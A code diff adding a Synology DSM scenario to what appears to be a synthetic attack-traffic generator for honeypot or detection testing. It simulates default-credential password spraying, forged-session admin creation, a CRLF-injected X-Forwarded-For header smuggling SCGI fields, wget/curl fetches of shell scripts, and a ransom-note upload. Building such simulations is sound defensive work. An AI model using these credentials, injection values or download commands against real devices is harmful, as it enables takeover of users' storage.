@@ -1090,3 +1090,182 @@ def build_sip(rng: random.Random, ip: str) -> Plan:
             "transports": ["udp"],
         },
     )
+
+
+# ---------------------------------------------------------------- Synology DSM
+
+DSM_USERS = ["admin", "admin", "admin", "root", "user", "guest", "administrator", "synology"]
+DSM_PASSWORDS = [
+    "admin", "password", "123456", "synology", "12345678", "admin123", "qwerty", "changeme",
+    "Passw0rd", "1234", "welcome1", "root", "diskstation", "P@ssw0rd",
+]  # fmt: skip
+DSM_AGENTS = [
+    "python-requests/2.31.0",
+    "Go-http-client/1.1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+    "curl/8.5.0",
+    "",  # no user agent at all
+]
+DSM_CVES = ["CVE-2026-13639", "CVE-2026-13684"]
+
+
+def _dsm_req(
+    b: Builder,
+    agent: str,
+    method: str,
+    path: str,
+    query: str,
+    body: str,
+    status: int,
+    flags: list[str],
+    *,
+    gap: tuple[float, float] = (0.1, 1.0),
+    **extra: Any,
+) -> None:
+    headers = {"Host": "nas", "Accept": "*/*", "Connection": "close"}
+    if agent:
+        headers["User-Agent"] = agent
+    else:
+        flags = [*flags, "no_user_agent"]
+    if method == "POST":
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        headers["Content-Length"] = str(len(body))
+    headers.update(extra.pop("headers", {}))
+    data: dict[str, Any] = {
+        "method": method,
+        "path": path,
+        "query": query,
+        "headers": headers,
+        "user_agent": agent,
+        "body_preview": body,
+        "status": status,
+        "flags": flags,
+    }
+    if {"sid_forge", "scgi_injection"} & set(flags):
+        data["cve"] = list(DSM_CVES)
+    data.update(extra)
+    b.add(EventType.http_request, data, gap)
+
+
+def build_synology(rng: random.Random, ip: str) -> Plan:
+    tls = rng.random() < 0.45
+    plan = _new_plan(rng, SensorName.synology, ip, 5001 if tls else 5000)
+    b = Builder(rng, plan)
+    b.connect({"tls": tls, "protocol": "HTTP"})
+    agent = rng.choice(DSM_AGENTS)
+    kind = pick(
+        rng,
+        [
+            ("version", 30),
+            ("spray", 40),
+            ("sid_forge", 8),
+            ("scgi", 8),
+            ("ransom", 3),
+            ("browse", 11),
+        ],
+    )
+    api = ["dsm_api"]
+    entry = "/webapi/entry.cgi"
+    if kind == "version":
+        for path, query in rng.sample(
+            [
+                ("/webapi/query.cgi", "api=SYNO.API.Info&version=1&method=query&query=all"),
+                ("/webman/info.cgi", ""),
+                ("/webman/login.cgi", ""),
+                ("/", ""),
+            ],
+            rng.randint(1, 3),
+        ):
+            webapi = path.startswith("/webapi")
+            _dsm_req(
+                b,
+                agent,
+                "GET",
+                path,
+                query,
+                "",
+                200,
+                ["dsm_api", "dsm_version_probe"] if webapi else ["dsm_version_probe"],
+            )
+    elif kind == "spray":
+        users = rng.sample(DSM_USERS, rng.randint(1, 3))
+        for user in users:
+            for pw in rng.sample(DSM_PASSWORDS, rng.randint(3, 10)):
+                otp = rng.random() < 0.05
+                body = f"api=SYNO.API.Auth&version=7&method=login&account={user}&passwd={pw}"
+                _dsm_req(
+                    b, agent, "POST", entry, "", body, 403, [*api, "dsm_login"], gap=(0.2, 0.9)
+                )
+                b.add(
+                    EventType.login_attempt,
+                    {
+                        "username": user,
+                        "password": pw,
+                        "otp_present": otp,
+                        "success": False,
+                        "method": "SYNO.API.Auth",
+                    },
+                    (0.0, 0.05),
+                )
+        if rng.random() < 0.12:
+            _dsm_req(b, agent, "POST", entry, "", "x" * 2048, 413, [*api, "oversized_body"])
+    elif kind == "sid_forge":
+        sid = _rand_alnum(
+            rng, 24, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+        )
+        _dsm_req(b, agent, "GET", "/webman/info.cgi", "", "", 200, ["dsm_version_probe"])
+        _dsm_req(
+            b,
+            agent,
+            "POST",
+            entry,
+            f"_sid={sid}",
+            "api=SYNO.Core.User&version=1&method=create&name=sysadm",
+            200,
+            [*api, "sid_forge"],
+            headers={"Cookie": f"id={sid}"},
+        )
+        if rng.random() < 0.5:
+            host = synthetic_host(rng)
+            url = f"http://{host}/{_rand_alnum(rng, 6, 'abcdefghijklmnopqrstuvwxyz')}.sh"
+            b.add(
+                EventType.download_attempt,
+                {"url": url, "tool": "wget", "command": "wget " + url},
+                (0.1, 0.8),
+            )
+    elif kind == "scgi":
+        _dsm_req(
+            b,
+            agent,
+            "POST",
+            entry,
+            "",
+            "api=SYNO.API.Auth&version=7&method=login",
+            200,
+            [*api, "scgi_injection"],
+            headers={"X-Forwarded-For": "127.0.0.1\r\nSCGI: 1\r\nREMOTE_USER: admin"},
+        )
+        if rng.random() < 0.4:
+            host = synthetic_host(rng)
+            url = f"http://{host}/{_rand_alnum(rng, 6, 'abcdefghijklmnopqrstuvwxyz')}.sh"
+            b.add(
+                EventType.download_attempt,
+                {"url": url, "tool": "curl", "command": "curl -O " + url},
+                (0.1, 0.8),
+            )
+    elif kind == "ransom":
+        _dsm_req(b, agent, "GET", "/webman/info.cgi", "", "", 200, ["dsm_version_probe"])
+        _dsm_req(
+            b,
+            agent,
+            "POST",
+            entry,
+            "",
+            "api=SYNO.FileStation.Upload&method=upload&path=/volume1/homes&filename=README_C3RB3R.txt",
+            200,
+            [*api, "file_write", "ransom_indicator"],
+        )
+    else:
+        for path in rng.sample(["/", "/index.cgi", "/favicon.ico", "/robots.txt"], 2):
+            _dsm_req(b, agent, "GET", path, "", "", 200, [])
+    return b.finish("closed", extra={"tls": tls})
